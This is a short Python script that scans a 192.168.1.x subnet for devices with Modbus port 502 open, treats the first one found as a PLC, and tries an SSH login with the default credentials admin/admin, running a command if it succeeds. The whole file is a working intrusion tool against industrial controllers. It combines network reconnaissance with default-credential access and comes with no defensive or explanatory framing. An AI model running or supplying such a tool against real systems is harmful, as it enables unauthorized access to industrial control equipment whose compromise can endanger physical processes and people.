import socket
import paramiko

# Function to discover the PLC's IP address
def discover_plc_ip(network_prefix="192.168.1.", timeout=1):
    for i in range(1, 255):
        ip = network_prefix + str(i)
        try:
            # Attempt to connect to the IP address on a common PLC port (e.g., 502 for Modbus)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, 502))
            if result == 0:
                print(f"Discovered PLC at IP: {ip}")
                return ip
            sock.close()
        except Exception as e:
            print(f"Error scanning {ip}: {e}")
    print("PLC not found in the specified network range.")
    return None

# Function to attempt login using default credentials
def attempt_login(ip, username="admin", password="admin"):
    try:
        # Initialize SSH client
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        # Attempt to connect
        ssh.connect(ip, username=username, password=password)
        print(f"Successfully logged into {ip} with default credentials.")
        
        # Execute a command (e.g., list files in the root directory)
        stdin, stdout, stderr = ssh.exec_command("ls")
        print(stdout.read().decode())
        
        ssh.close()
    except paramiko.AuthenticationException:
        print(f"Failed to login to {ip} with default credentials.")
    except Exception as e:
        print(f"Error connecting to {ip}: {e}")

# Main function
def main():
    # Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    
    if plc_ip:
        # Attempt to login using default credentials
        attempt_login(plc_ip)

if __name__ == "__main__":
    main()